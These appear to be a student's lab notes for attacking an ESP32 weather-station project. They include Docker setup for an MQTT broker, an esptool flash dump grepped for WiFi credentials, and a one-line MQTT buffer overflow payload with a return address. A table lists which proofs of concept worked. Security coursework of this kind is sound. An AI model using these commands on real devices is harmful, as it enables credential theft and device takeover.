```
Mosquitto Client
docker run -d \
  --name mosquitto \
  -p 1883:1883 \
  -p 9001:9001 \
  -v "/Users/pep/development/hhs-projecten/Weather Station/mosquitto/mosquitto.conf":/mosquitto/config/mosquitto.conf \
  eclipse-mosquitto

run server:
docker build -t esp32-backend /server/.
docker run -p 5000:5000 esp32-backend
```

```
Flash Dump
esptool -p /dev/cu.usbserial-A5069RR4 --baud 115200 read-flash 0 0x200000 esp1.bin
strings esp1.bin | grep -A 5 "wifinaam"
```

```
Buffer overflow
mosquitto_pub -h 192.168.1.181 -t "device/rename" -m "$(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*32 + b"\x04\x93\x0d\x40")')"
```

```
Wifi sniffing
Wireshark => lo0
http.request.method == "POST"
inloggen op de site
```

PoC             |   Werkt?
Wifi Sniffing   |   Ja
MQTT DoS        |   Ja
UART SQL-I      |   Nee
BLE MitM        |   Nee => 2e esp nodig en schermpje
Rogue Library   |   Nee
Rogue Wifi      |   Nee
Buffer Overflow |   Ja
Flash Dump      |   Ja
Over-the-Air    |   Nee
